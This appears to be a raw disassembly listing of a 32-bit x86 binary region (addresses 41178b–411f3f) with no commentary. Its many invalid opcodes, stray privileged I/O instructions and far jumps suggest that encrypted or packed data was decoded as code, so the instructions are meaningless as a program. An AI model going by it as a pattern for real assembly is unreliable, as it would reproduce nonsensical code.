  41178b:	mov    dh,0x19
  41178d:	and    ebx,DWORD PTR [ebp-0x541df1d7]
  411793:	mov    ah,0xad
  411795:	mov    BYTE PTR [eax],al
  411797:	(bad)  
  411798:	pop    ecx
  411799:	or     bh,bl
  41179b:	(bad)  
  41179c:	xchg   ebp,eax
  41179d:	inc    esp
  41179e:	in     eax,dx
  41179f:	in     eax,dx
  4117a0:	sbb    dh,BYTE PTR [edx-0x61]
  4117a3:	cmc    
  4117a4:	cmp    eax,0x2544e5af
  4117a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117aa:	outs   dx,BYTE PTR ds:[esi]
  4117ab:	mov    ebx,DWORD PTR [edx-0x627133eb]
  4117b1:	push   esi
  4117b2:	cmc    
  4117b3:	es push esp
  4117b5:	daa    
  4117b6:	adc    al,0x65
  4117b8:	xchg   ecx,eax
  4117b9:	push   esp
  4117ba:	inc    esp
  4117bb:	xchg   ebx,eax
  4117bc:	outs   dx,DWORD PTR ds:[esi]
  4117bd:	xor    BYTE PTR [esi],cl
  4117bf:	mov    DWORD PTR [ebx+0x44],ecx
  4117c2:	or     eax,0xd6e0a202
  4117c7:	cmp    al,0xb
  4117c9:	shl    DWORD PTR [eax-0x3f],0x51
  4117cd:	dec    edx
  4117ce:	in     eax,dx
  4117cf:	pop    es
  4117d0:	dec    esp
  4117d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117d2:	stos   BYTE PTR es:[edi],al
  4117d3:	xor    ah,cl
  4117d5:	pop    ebx
  4117d6:	mov    edx,0xdf813c9e
  4117db:	cmp    al,0x39
  4117dd:	mov    WORD PTR [edi],gs
  4117df:	mov    esi,0xd35ace0b
  4117e4:	sub    al,0xda
  4117e6:	mov    eax,0xba428714
  4117eb:	inc    edi
  4117ec:	repz sbb cl,BYTE PTR [ecx+edx*1-0x60]
  4117f1:	mov    bh,0x93
  4117f3:	push   ss
  4117f4:	rcl    DWORD PTR [eax],1
  4117f6:	aaa    
  4117f7:	std    
  4117f8:	ds out 0x1d,eax
  4117fb:	inc    esp
  4117fc:	data16 std 
  4117fe:	sar    dl,1
  411800:	fucomi st,st(0)
  411802:	or     bl,BYTE PTR [edi]
  411804:	iret   
  411805:	(bad)  
  411807:	cld    
  411808:	ds call 0xcfb:0x7a7a5ae6
  411810:	jge    0x4117e9
  411812:	xor    ecx,DWORD PTR [edi]
  411814:	cmp    al,0x11
  411816:	xchg   edx,eax
  411817:	mov    cs,WORD PTR [edx+ebx*8-0x66b665a3]
  41181e:	bound  edx,QWORD PTR [ebp-0x41]
  411821:	test   al,0xc2
  411823:	add    bh,BYTE PTR [eax-0x4d3d910f]
  411829:	jge    0x4117ff
  41182b:	loope  0x411832
  41182d:	in     eax,0xe1
  41182f:	ret    
  411830:	inc    edi
  411831:	inc    edi
  411832:	ds xchg ecx,eax
  411834:	and    al,0xf2
  411836:	and    DWORD PTR [edx+0x39c24787],0x59
  41183d:	fiadd  DWORD PTR [ebx-0x47]
  411840:	dec    edx
  411841:	and    esi,ecx
  411843:	std    
  411844:	add    BYTE PTR [ebx-0x141e0ac6],cl
  41184a:	test   eax,0xafd59403
  41184f:	sub    bl,dl
  411851:	jbe    0x4117e7
  411853:	jnp    0x4118ad
  411855:	xchg   ebx,eax
  411856:	adc    ebx,DWORD PTR [edx-0x6eac94e7]
  41185c:	imul   edx,DWORD PTR [ebx+ecx*1-0x63],0x22
  411861:	mov    BYTE PTR [eax-0x7987b152],cl
  411867:	jge    0x411842
  411869:	cmp    DWORD PTR [edi+0x1c],edx
  41186c:	outs   dx,DWORD PTR ds:[esi]
  41186d:	pop    ecx
  41186e:	add    bh,ch
  411870:	int    0xc3
  411872:	inc    ebx
  411873:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411874:	add    DWORD PTR [ebx+0x57f1c8eb],ecx
  41187a:	hlt    
  41187b:	cld    
  41187c:	adc    DWORD PTR [ecx+0x51],ebx
  41187f:	clc    
  411880:	out    dx,eax
  411881:	inc    esi
  411882:	je     0x4118c2
  411884:	out    0x7a,eax
  411886:	cdq    
  411887:	sub    al,0xa8
  411889:	mov    ebx,0x3fb61246
  41188e:	mov    bl,0xe7
  411890:	cmp    al,0x2d
  411892:	dec    eax
  411893:	sbb    dh,BYTE PTR [edi+0x1f]
  411896:	or     BYTE PTR [ecx],ah
  411898:	sti    
  411899:	push   0xb76f8e34
  41189e:	rol    DWORD PTR [ecx],0x68
  4118a1:	rcr    DWORD PTR [esi+0x330f696f],1
  4118a7:	cwde   
  4118a8:	loop   0x4118a9
  4118aa:	outs   dx,DWORD PTR ds:[esi]
  4118ab:	rol    esi,0xce
  4118ae:	add    DWORD PTR [eax+eiz*2+0x7f],esp
  4118b2:	pusha  
  4118b3:	aas    
  4118b4:	xchg   ebp,eax
  4118b5:	std    
  4118b6:	sub    ch,BYTE PTR [ebx]
  4118b8:	sub    DWORD PTR [edx],edx
  4118ba:	xchg   edx,eax
  4118bb:	mov    dh,bl
  4118bd:	jo     0x41191f
  4118bf:	xchg   ebx,eax
  4118c0:	jo     0x411842
  4118c2:	cmp    al,0xc8
  4118c4:	sub    bh,cl
  4118c6:	adc    cl,bl
  4118c8:	dec    esi
  4118c9:	jle    0x41188e
  4118cb:	cwde   
  4118cc:	ins    DWORD PTR es:[edi],dx
  4118cd:	rcl    bl,0xd0
  4118d0:	sub    cl,bl
  4118d2:	mov    BYTE PTR ds:0x123149de,dl
  4118d8:	test   al,0xb3
  4118da:	cmp    edi,DWORD PTR [eax+0x5d9ee663]
  4118e0:	ss jb  0x4118c7
  4118e3:	or     al,0x4d
  4118e5:	mov    ah,0x20
  4118e7:	adc    eax,0x2b641500
  4118ec:	push   ecx
  4118ed:	push   cs
  4118ee:	adc    al,0xcd
  4118f0:	fist   DWORD PTR [eax-0x2224740f]
  4118f6:	int3   
  4118f7:	inc    edx
  4118f8:	inc    ebx
  4118f9:	int    0xbf
  4118fb:	push   0xe98425ff
  411900:	mov    edi,0xe7a88112
  411905:	xor    al,0x8f
  411907:	fimul  WORD PTR [ecx+0xd68dd27]
  41190d:	jecxz  0x4118e7
  41190f:	adc    DWORD PTR [esi+0x9583001],esp
  411915:	mov    ch,0x8d
  411917:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411918:	add    al,0xd
  41191a:	popa   
  41191b:	or     ecx,esi
  41191d:	int    0xcf
  41191f:	outs   dx,BYTE PTR ds:[esi]
  411920:	(bad)  
  411921:	in     al,0x3c
  411923:	fcmovnbe st,st(0)
  411925:	dec    eax
  411926:	jnp    0x411902
  411928:	mov    ecx,0xbbdf74f5
  41192d:	das    
  41192e:	mov    dl,0x96
  411930:	out    0xbc,eax
  411932:	jno    0x4118d6
  411934:	fadd   QWORD PTR [ebx+0xc]
  411937:	test   DWORD PTR [ebx+0x2d],esi
  41193a:	xchg   ecx,eax
  41193b:	out    dx,al
  41193c:	push   cs
  41193d:	aas    
  41193e:	sbb    ebp,DWORD PTR [edx+0x11a5b585]
  411944:	stos   DWORD PTR es:[edi],eax
  411945:	mov    ebp,0x3c93e564
  41194a:	pushf  
  41194b:	fwait
  41194c:	dec    esp
  41194d:	pushf  
  41194e:	int    0xd1
  411950:	xchg   BYTE PTR [ebx],dh
  411952:	shr    dh,1
  411954:	cld    
  411955:	les    ebx,FWORD PTR [edx-0x47]
  411958:	js     0x411908
  41195a:	mov    BYTE PTR [edi-0xf],dh
  41195d:	jl     0x411902
  41195f:	fmul   QWORD PTR [ebx]
  411961:	fimul  WORD PTR [ecx+ecx*4-0x7bfdf450]
  411968:	pop    ss
  411969:	cmp    BYTE PTR [edx+0x7c],ch
  41196c:	push   0xffffffd7
  41196e:	adc    DWORD PTR [eax+0x65],ebx
  411971:	mov    ebx,0xb6be41bf
  411976:	lock ret 
  411978:	mov    esp,gs
  41197a:	hlt    
  41197b:	repnz push ebx
  41197d:	int3   
  41197e:	cmp    al,0x79
  411980:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411981:	xor    BYTE PTR [eax+0x7],bl
  411984:	adc    bh,dh
  411986:	sbb    al,0x5b
  411988:	call   0x7cc8:0xe5e31d16
  41198f:	add    ch,BYTE PTR [ebx+0x1b4edf4e]
  411995:	daa    
  411996:	loopne 0x4119b0
  411998:	scas   eax,DWORD PTR es:[edi]
  411999:	sar    ecx,cl
  41199b:	(bad)  
  41199c:	sbb    ch,ch
  41199e:	test   eax,esi
  4119a0:	retf   0xce72
  4119a3:	or     al,0xdc
  4119a5:	or     BYTE PTR [esi-0x13db1cd9],0x63
  4119ac:	and    eax,0xf0e9b78c
  4119b1:	add    eax,DWORD PTR ds:0x3c60610e
  4119b7:	sbb    eax,0x26b3cd4e
  4119bc:	jp     0x4119b4
  4119be:	scas   eax,DWORD PTR es:[edi]
  4119bf:	mov    ebp,0xd17f19c4
  4119c4:	out    dx,al
  4119c5:	sub    dl,BYTE PTR [esi-0x725dc02b]
  4119cb:	cmp    eax,0x4bb82a52
  4119d0:	mov    eax,ds:0xbc380108
  4119d5:	push   ebp
  4119d6:	scas   eax,DWORD PTR es:[edi]
  4119d7:	outs   dx,BYTE PTR ds:[esi]
  4119d8:	bound  edi,QWORD PTR [edx+0x3b2436e]
  4119de:	mov    BYTE PTR [edi],0x8
  4119e1:	fwait
  4119e2:	rcl    DWORD PTR [ebx],1
  4119e4:	into   
  4119e5:	sub    eax,0xb76aa482
  4119ea:	adc    BYTE PTR [edx+0xd8e0fd4],cl
  4119f0:	xor    BYTE PTR [ebp-0x7a3fcfb5],al
  4119f6:	scas   eax,DWORD PTR es:[edi]
  4119f7:	pop    esi
  4119f8:	test   ebp,edx
  4119fa:	add    esp,ebp
  4119fc:	sub    dl,BYTE PTR [eax]
  4119fe:	pop    ebp
  4119ff:	inc    esp
  411a00:	retf   
  411a01:	les    esp,FWORD PTR [ebx-0x35]
  411a04:	lock mov fs,WORD PTR [esi+ecx*8]
  411a08:	ss sbb eax,0x8f12690
  411a0e:	in     eax,0x64
  411a10:	jecxz  0x411a35
  411a12:	(bad)  
  411a13:	adc    edi,DWORD PTR gs:[ecx+0x163b9ea1]
  411a1a:	retf   0xce41
  411a1d:	and    al,0x7f
  411a1f:	iret   
  411a20:	mul    DWORD PTR [ecx]
  411a22:	push   ebp
  411a23:	or     BYTE PTR [esi-0x57],al
  411a26:	and    al,0xcf
  411a28:	xchg   dh,cl
  411a2a:	xchg   ecx,eax
  411a2b:	jmp    0xfe9c:0x4d5c4c56
  411a32:	stos   BYTE PTR es:[edi],al
  411a33:	scas   eax,DWORD PTR es:[edi]
  411a34:	popa   
  411a35:	(bad)  
  411a36:	retf   
  411a37:	pop    ds
  411a38:	shr    DWORD PTR [ecx+0x11bdbbb7],cl
  411a3e:	cdq    
  411a3f:	ins    BYTE PTR es:[edi],dx
  411a40:	cmp    DWORD PTR [ecx],edx
  411a42:	xor    dl,0xdf
  411a45:	fisubr WORD PTR [edx-0x30b6fa32]
  411a4b:	repnz dec esi
  411a4d:	and    BYTE PTR [edi+0x4a5934ce],0x32
  411a54:	cmc    
  411a55:	aas    
  411a56:	ret    
  411a57:	sub    ecx,esp
  411a59:	stos   DWORD PTR es:[edi],eax
  411a5a:	lods   al,BYTE PTR ds:[esi]
  411a5b:	out    dx,eax
  411a5c:	call   0x38633cca
  411a61:	pushf  
  411a62:	scas   al,BYTE PTR es:[edi]
  411a63:	push   es
  411a64:	std    
  411a65:	(bad)  
  411a66:	jno    0x411a37
  411a68:	jmp    0xa652:0xcf96b618
  411a6f:	iret   
  411a70:	adc    BYTE PTR [esi],dl
  411a72:	cwde   
  411a73:	aam    0xbd
  411a75:	pop    edi
  411a76:	push   ss
  411a77:	adc    ebx,DWORD PTR [ebp+edx*8-0x29c19949]
  411a7e:	cli    
  411a7f:	stc    
  411a80:	dec    edx
  411a81:	dec    esp
  411a82:	fs jg  0x411a5c
  411a85:	nop
  411a86:	hlt    
  411a87:	(bad)  
  411a88:	(bad)  
  411a89:	pop    ecx
  411a8a:	rol    ebp,0x26
  411a8d:	dec    ebp
  411a8e:	hlt    
  411a8f:	jbe    0x411a37
  411a91:	jbe    0x411a9a
  411a93:	mov    eax,0x7425936e
  411a98:	dec    esi
  411a99:	mov    esp,0xca1efe0e
  411a9e:	xchg   ebp,eax
  411a9f:	(bad)
  411aa2:	enter  0x4c16,0x5e
  411aa6:	and    dl,BYTE PTR [edi+0x6be06867]
  411aac:	fcomp  DWORD PTR [edi-0x3b49705]
  411ab2:	scas   eax,DWORD PTR es:[edi]
  411ab3:	shr    DWORD PTR [eax+0x4ac7dab9],1
  411ab9:	cld    
  411aba:	mov    esi,DWORD PTR [eax+0x79b1448c]
  411ac0:	or     eax,0x9954639e
  411ac5:	inc    eax
  411ac6:	push   esp
  411ac7:	cmp    dh,BYTE PTR [edi]
  411ac9:	fstp   TBYTE PTR [edx]
  411acb:	xchg   BYTE PTR [edx+0x44],cl
  411ace:	sub    BYTE PTR [edi+0x3386e47c],ah
  411ad4:	mov    ecx,0x9cb413be
  411ad9:	lock dec ebp
  411adb:	push   ebp
  411adc:	ss sti 
  411ade:	mov    ch,0xa7
  411ae0:	sbb    ebp,ebp
  411ae2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ae3:	add    al,0xe
  411ae5:	mov    ?,WORD PTR [ecx]
  411ae7:	mov    bl,0xbb
  411ae9:	adc    eax,0xc7690f85
  411aee:	or     al,0x76
  411af0:	aam    0xc6
  411af2:	xor    al,0x43
  411af4:	daa    
  411af5:	pusha  
  411af6:	repz jp 0x411aec
  411af9:	inc    edi
  411afa:	cmp    esi,eax
  411afc:	xor    dh,BYTE PTR [eax+0x3197b079]
  411b02:	pop    ecx
  411b03:	sub    al,0x7
  411b05:	add    bh,BYTE PTR [ecx-0x753ece6b]
  411b0b:	mov    edx,0xff8e3317
  411b10:	repnz or eax,0xd9b2604d
  411b16:	pop    ebx
  411b17:	add    al,0x2b
  411b19:	out    0x21,al
  411b1b:	std    
  411b1c:	hlt    
  411b1d:	pop    eax
  411b1e:	cli    
  411b1f:	fucomip st,st(4)
  411b21:	(bad)  
  411b22:	xor    eax,0x65d83dcf
  411b27:	dec    edx
  411b28:	gs popa 
  411b2a:	ficom  WORD PTR [edx-0x72]
  411b2d:	popa   
  411b2e:	adc    edi,DWORD PTR [eax-0x1c]
  411b31:	mov    esp,0x8f1a1cc8
  411b36:	lods   eax,DWORD PTR ds:[esi]
  411b37:	sbb    eax,0xf0b277fe
  411b3c:	aad    0x3d
  411b3e:	mov    edi,0x6e965cd4
  411b43:	xchg   edx,eax
  411b44:	fbstp  TBYTE PTR ds:0xb5447701
  411b4a:	xchg   ebx,eax
  411b4b:	mov    al,0xce
  411b4d:	push   ebx
  411b4e:	jns    0x411bc8
  411b50:	imul   edx,DWORD PTR [ecx-0x2cf829b9],0xdd65cf22
  411b5a:	xchg   esp,eax
  411b5b:	jbe    0x411bdc
  411b5d:	dec    ecx
  411b5e:	pop    edi
  411b5f:	pop    eax
  411b60:	mov    esp,0xb717fe67
  411b65:	mov    esp,0xb560b1ad
  411b6a:	ret    
  411b6b:	xlat   BYTE PTR ds:[ebx]
  411b6c:	cwde   
  411b6d:	popa   
  411b6e:	fadd   st,st(2)
  411b70:	sar    DWORD PTR [edx],0xd1
  411b73:	inc    ecx
  411b74:	lahf   
  411b75:	inc    eax
  411b76:	pop    eax
  411b77:	daa    
  411b78:	out    0x5e,eax
  411b7a:	leave  
  411b7b:	es inc ebp
  411b7d:	scas   eax,DWORD PTR es:[edi]
  411b7e:	xor    al,0x13
  411b80:	out    dx,al
  411b81:	add    DWORD PTR [ebx],edx
  411b83:	scas   eax,DWORD PTR es:[edi]
  411b84:	sub    edi,esp
  411b86:	jp     0x411bc5
  411b88:	je     0x411b57
  411b8a:	aad    0x82
  411b8c:	xor    al,0x7
  411b8e:	xor    ebp,DWORD PTR [esi+0x7]
  411b91:	retf   
  411b92:	shl    DWORD PTR [ecx+0xa],0x68
  411b96:	out    0x7c,al
  411b98:	and    al,0xb6
  411b9a:	inc    ebx
  411b9b:	and    DWORD PTR ds:0xeafb294b,edx
  411ba1:	lock data16 mov dh,0x69
  411ba5:	mov    dl,0x1a
  411ba7:	sbb    al,0x4e
  411ba9:	je     0x411b7d
  411bab:	pop    ecx
  411bac:	or     eax,0x7c94055f
  411bb1:	stos   DWORD PTR es:[edi],eax
  411bb2:	and    DWORD PTR [eax+0x1d40473e],0xffffffa7
  411bb9:	rcr    DWORD PTR [eax+0x4530555a],0x1a
  411bc0:	push   edi
  411bc1:	vpackssdw xmm1,xmm3,XMMWORD PTR ds:0xb10009de
  411bc9:	mov    DWORD PTR [ebx],ebx
  411bcb:	mov    cl,0x29
  411bcd:	xchg   ebx,eax
  411bce:	push   ebp
  411bcf:	cmp    cl,BYTE PTR [ebx-0x3ec22f97]
  411bd5:	in     al,0xf6
  411bd7:	jle    0x411b6b
  411bd9:	test   DWORD PTR [edi-0x44],ecx
  411bdc:	mov    al,ds:0xec3fa472
  411be1:	les    esp,FWORD PTR [ecx+esi*4+0x32]
  411be5:	outs   dx,BYTE PTR ds:[esi]
  411be6:	mov    esi,0x9af34273
  411beb:	pusha  
  411bec:	jbe    0x411c09
  411bee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bef:	add    ah,al
  411bf1:	sbb    eax,0x3fecaf5b
  411bf6:	cmp    BYTE PTR [esi+ecx*2+0xe],bh
  411bfa:	iret   
  411bfb:	xchg   esi,eax
  411bfc:	mov    al,ds:0x638e93a6
  411c01:	add    BYTE PTR [esi+edx*4+0x44],al
  411c05:	iret   
  411c06:	mov    ah,0xb8
  411c08:	mov    WORD PTR cs:[ebp-0x6f96186a],fs
  411c0f:	not    DWORD PTR [edi-0x4b]
  411c12:	mov    ch,0xb
  411c14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c15:	stos   DWORD PTR es:[edi],eax
  411c16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c17:	xchg   ebp,eax
  411c18:	ins    BYTE PTR es:[edi],dx
  411c19:	push   esi
  411c1a:	loopne 0x411c43
  411c1c:	dec    esp
  411c1d:	aaa    
  411c1e:	out    dx,eax
  411c1f:	mov    eax,0x24fad19d
  411c24:	mov    bh,ah
  411c26:	jne    0x411c67
  411c28:	(bad)  
  411c29:	or     ebx,DWORD PTR [eax]
  411c2b:	rcr    ebp,0xc8
  411c2e:	sbb    BYTE PTR [eax-0x5c],al
  411c31:	xor    DWORD PTR [edx-0x7c9c7ea8],esp
  411c37:	sub    BYTE PTR [edx+0x72cfad24],0xf1
  411c3e:	jno    0x411bd7
  411c40:	loopne 0x411c6a
  411c42:	icebp  
  411c43:	mov    edi,0x703420ae
  411c48:	adc    al,0xfc
  411c4a:	cmp    bh,BYTE PTR [edi+0x53151eac]
  411c50:	aaa    
  411c51:	mov    ch,0xa7
  411c53:	xchg   BYTE PTR [ebx+0x78b23bf4],dl
  411c59:	mov    ecx,0x91154e3d
  411c5e:	and    BYTE PTR [edx],0x67
  411c61:	ror    DWORD PTR [edi+0x56dabbd1],0x8f
  411c68:	les    eax,FWORD PTR [ebx-0x3f000eed]
  411c6e:	push   edi
  411c6f:	sub    al,0xef
  411c71:	pop    es
  411c72:	or     BYTE PTR [edx-0x7e482522],0x8e
  411c79:	leave  
  411c7a:	xor    ebx,DWORD PTR [esi-0x1b]
  411c7d:	test   al,0x89
  411c7f:	xchg   ecx,eax
  411c80:	stos   BYTE PTR es:[edi],al
  411c81:	dec    edx
  411c82:	mov    ecx,0xf6e47b22
  411c87:	xor    esp,DWORD PTR [eax]
  411c89:	sub    BYTE PTR [edi+edi*1+0x52],al
  411c8d:	push   ss
  411c8e:	dec    DWORD PTR ds:0x88ebac5a
  411c94:	xchg   edi,eax
  411c95:	mov    ds,WORD PTR [edi]
  411c97:	test   eax,0xc49aa48e
  411c9c:	not    BYTE PTR [ebx-0x75cb6652]
  411ca2:	cmp    ecx,DWORD PTR [ecx+0x33243af]
  411ca8:	xor    BYTE PTR [ebp*2-0x71e0a7b8],dl
  411caf:	push   edi
  411cb0:	jmp    0xecdb:0x3d4c5833
  411cb7:	mov    ah,0xac
  411cb9:	mov    eax,ds:0x720d7784
  411cbe:	fdiv   QWORD PTR [ecx-0x5357d8e8]
  411cc4:	(bad)  
  411cc5:	fild   QWORD PTR [edx+0x5d70742f]
  411ccb:	adc    DWORD PTR [ecx-0x3128c4e4],esi
  411cd1:	xor    al,0x6b
  411cd3:	lds    ebp,FWORD PTR [ebx]
  411cd5:	imul   ebp,edi,0x85ce3650
  411cdb:	or     BYTE PTR [eax+0x29],0x57
  411cdf:	xor    ecx,DWORD PTR [ecx+0x294695c8]
  411ce5:	sar    DWORD PTR [edi],cl
  411ce7:	loope  0x411d17
  411ce9:	fwait
  411cea:	adc    bl,BYTE PTR [edi]
  411cec:	mov    esp,0x96800d16
  411cf1:	aas    
  411cf2:	cs mov esi,0x1d4666ba
  411cf8:	pushf  
  411cf9:	pop    ecx
  411cfa:	inc    ebp
  411cfb:	cmp    esi,DWORD PTR [ecx+eiz*1-0x5ce6cecb]
  411d02:	mov    cl,0xaf
  411d04:	sub    eax,0x5f33470f
  411d09:	add    BYTE PTR [ecx],bl
  411d0b:	out    0x5e,eax
  411d0d:	aad    0xab
  411d0f:	xor    cl,al
  411d11:	ret    
  411d12:	loopne 0x411d6e
  411d14:	xor    al,0xd4
  411d16:	xchg   esp,eax
  411d17:	xor    eax,0x2b6e9655
  411d1c:	jnp    0x411d15
  411d1e:	fistp  WORD PTR [esi+0x10]
  411d21:	xchg   ecx,eax
  411d22:	jo     0x411d03
  411d24:	aam    0x93
  411d26:	mov    ds:0xce38e9b,al
  411d2b:	(bad)  
  411d2c:	lds    esi,FWORD PTR [edi-0x66]
  411d2f:	sbb    al,0x17
  411d31:	je     0x411d0b
  411d33:	add    bl,ah
  411d35:	sbb    eax,0x2d6e60cf
  411d3a:	sbb    cl,ah
  411d3c:	shr    edi,0xc8
  411d3f:	add    DWORD PTR [ebx+0x5c],eax
  411d42:	xor    edi,DWORD PTR ds:0x4352a64e
  411d48:	push   ecx
  411d49:	push   edi
  411d4a:	or     ah,dh
  411d4c:	fadd   QWORD PTR [edx]
  411d4e:	add    esp,DWORD PTR [ecx]
  411d50:	pop    edi
  411d51:	sub    BYTE PTR [edx+0x3d498ce2],bl
  411d57:	lods   eax,DWORD PTR ds:[esi]
  411d58:	ss sub al,0xfb
  411d5b:	ficomp WORD PTR [eax-0x493825a9]
  411d61:	sbb    DWORD PTR [ebp-0xe],esp
  411d64:	rol    BYTE PTR [edx],1
  411d66:	(bad)  
  411d67:	cmp    ecx,DWORD PTR [eax-0x6f56e344]
  411d6d:	cmp    cl,ah
  411d6f:	inc    esp
  411d70:	xlat   BYTE PTR ds:[ebx]
  411d71:	mov    ch,0xc1
  411d73:	das    
  411d74:	fcomi  st,st(5)
  411d76:	jns    0x411d90
  411d78:	data16 jo 0x411dab
  411d7b:	mov    edi,0xa08b3750
  411d80:	fucomp st(0)
  411d82:	fisub  DWORD PTR [ebx]
  411d84:	adc    bl,cl
  411d86:	jmp    0x2fc3:0x71967009
  411d8d:	jmp    0xa7ee:0x96d647b1
  411d94:	sbb    eax,0xc4adb248
  411d99:	bound  ebx,QWORD PTR [ebx]
  411d9b:	push   0xffffffdb
  411d9d:	sbb    edx,DWORD PTR [ebx]
  411d9f:	lea    eax,[eax-0x12d50f2c]
  411da5:	add    BYTE PTR [edi+0x67dc73e2],0x4b
  411dac:	or     DWORD PTR [ecx-0x39d3a1e3],ebx
  411db2:	mov    edx,0xdfa1760b
  411db7:	inc    ebp
  411db8:	or     DWORD PTR [edi],ebx
  411dba:	inc    ecx
  411dbb:	or     al,0x9d
  411dbd:	shl    BYTE PTR [ecx-0x7e28c2cc],cl
  411dc3:	outs   dx,DWORD PTR ds:[esi]
  411dc4:	push   ebp
  411dc5:	shl    BYTE PTR [edx-0x78],0xaa
  411dc9:	push   eax
  411dca:	sub    BYTE PTR [ebx-0x5460515e],bh
  411dd0:	ja     0x411da0
  411dd2:	or     BYTE PTR [edx],bl
  411dd4:	leave  
  411dd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411dd6:	in     eax,dx
  411dd7:	adc    edx,0x6f
  411dda:	stos   DWORD PTR es:[edi],eax
  411ddb:	push   es
  411ddc:	(bad)  
  411de0:	test   BYTE PTR ds:0xc5ca9684,bh
  411de6:	xor    eax,0x82fdec36
  411deb:	repz scas eax,DWORD PTR es:[edi]
  411ded:	ja     0x411e1c
  411def:	push   esi
  411df0:	aam    0x19
  411df2:	and    DWORD PTR [ebp+edx*2+0x77],edi
  411df6:	mov    bh,0x98
  411df8:	push   edi
  411df9:	add    ecx,esp
  411dfb:	and    eax,0x19b12e24
  411e00:	mov    bh,0x98
  411e02:	xor    eax,0x203f2443
  411e07:	and    esp,DWORD PTR [ebx+0x4f]
  411e0a:	minps  xmm7,XMMWORD PTR [edi]
  411e0d:	outs   dx,BYTE PTR ds:[esi]
  411e0e:	int3   
  411e0f:	mov    fs,WORD PTR ds:0x40de302e
  411e15:	xchg   BYTE PTR ds:0xf801e51d,dl
  411e1b:	mov    gs,ebp
  411e1d:	arpl   WORD PTR gs:[eax],ax
  411e20:	dec    esp
  411e21:	jecxz  0x411dab
  411e23:	xchg   esi,eax
  411e24:	es and esp,edi
  411e27:	jge    0x411e59
  411e29:	mov    al,ds:0xd488540a
  411e2e:	or     BYTE PTR [ecx+0x1c],dl
  411e31:	shl    DWORD PTR [edi-0x2a],1
  411e34:	jns    0x411e67
  411e36:	repnz push ebp
  411e38:	ret    0xa571
  411e3b:	loope  0x411dcf
  411e3d:	jae    0x411e33
  411e3f:	adc    cl,ch
  411e41:	xchg   esp,eax
  411e42:	xchg   ecx,eax
  411e43:	(bad)  
  411e44:	iret   
  411e45:	sub    BYTE PTR [ecx-0x73508709],ch
  411e4b:	jae    0x411ec6
  411e4d:	rcl    BYTE PTR [edi-0x591f2888],0x37
  411e54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e55:	adc    al,0xfc
  411e57:	jae    0x411ea3
  411e59:	scas   al,BYTE PTR es:[edi]
  411e5a:	and    eax,0xb4757d44
  411e5f:	cdq    
  411e60:	mov    bl,0xd4
  411e62:	add    eax,0x4893aaf5
  411e67:	mov    ecx,0xcf81109b
  411e6c:	jle    0x411dfe
  411e6e:	xor    BYTE PTR [ebp-0x5b],bh
  411e71:	mov    esp,?
  411e73:	out    0x2a,eax
  411e75:	mov    ds:0x405dab97,eax
  411e7a:	aam    0x97
  411e7c:	add    eax,0xb9cd904a
  411e81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e82:	aas    
  411e83:	sub    eax,0xe141d1d4
  411e88:	scas   al,BYTE PTR es:[edi]
  411e89:	pop    ebx
  411e8a:	add    eax,0x5cdd008a
  411e8f:	jb     0x411e18
  411e91:	aaa    
  411e92:	aad    0x61
  411e94:	je     0x411e7f
  411e96:	stos   DWORD PTR es:[edi],eax
  411e97:	ss and ebp,edi
  411e9a:	mov    edi,0x4d87f3d3
  411e9f:	dec    ebp
  411ea0:	mov    WORD PTR [ecx-0x25facc18],gs
  411ea6:	jp     0x411e46
  411ea8:	mov    ebp,0x756c7f03
  411ead:	adc    DWORD PTR [eax+0x2],esi
  411eb0:	out    dx,al
  411eb1:	inc    eax
  411eb2:	sahf   
  411eb3:	imul   edx,eax,0x1c34a58d
  411eb9:	pop    edx
  411eba:	fwait
  411ebb:	in     al,dx
  411ebc:	popa   
  411ebd:	frndint 
  411ebf:	and    DWORD PTR [edx+0x78],ebp
  411ec2:	xchg   edx,eax
  411ec3:	hlt    
  411ec4:	xchg   esi,eax
  411ec5:	arpl   WORD PTR [ebx-0x78d15064],sp
  411ecb:	arpl   WORD PTR [edi+0x13],si
  411ece:	mov    eax,ds:0x9675cd5a
  411ed3:	pushf  
  411ed4:	popf   
  411ed5:	or     DWORD PTR [esi+0x40ed77d0],esi
  411edb:	add    ecx,edx
  411edd:	pop    ds
  411ede:	sub    eax,0x4ea62f2e
  411ee3:	push   cs
  411ee4:	xlat   BYTE PTR ds:[ebx]
  411ee5:	cmp    DWORD PTR [ebx],esp
  411ee7:	fld    TBYTE PTR ss:[ecx]
  411eea:	xor    eax,0x5569077b
  411eef:	sub    bh,BYTE PTR [edx-0x58]
  411ef2:	cdq    
  411ef3:	add    ebp,DWORD PTR [ebx+0x1c]
  411ef6:	cs popa 
  411ef8:	xor    edx,edx
  411efa:	stos   BYTE PTR es:[edi],al
  411efb:	pop    esi
  411efc:	dec    edi
  411efd:	cmp    ch,BYTE PTR [ebp+edi*1+0x49d16201]
  411f04:	shr    DWORD PTR [edx],1
  411f06:	cmp    DWORD PTR ds:0xf50e4bf7,ebp
  411f0c:	and    bl,al
  411f0e:	sti    
  411f0f:	mov    ecx,0xe2e9af3d
  411f14:	sub    cl,BYTE PTR [eax+0x39]
  411f17:	jne    0x411f0b
  411f19:	setae  BYTE PTR [ebx-0x74402a2]
  411f20:	mov    esi,0x7a234c37
  411f25:	pop    ebx
  411f26:	js     0x411ed0
  411f28:	test   bl,0xd7
  411f2b:	stc    
  411f2c:	(bad)  
  411f2d:	scas   eax,DWORD PTR es:[edi]
  411f2e:	push   ss
  411f2f:	cdq    
  411f30:	push   ebp
  411f31:	mov    eax,ds:0x292b90ac
  411f36:	sti    
  411f37:	or     DWORD PTR [eax+0x2e],ebx
  411f3a:	xchg   edi,eax
  411f3b:	pop    ds
  411f3c:	pusha  
  411f3d:	dec    esp
  411f3e:	iret   
  411f3f:	mov    DWORD PTR [bx],ebp
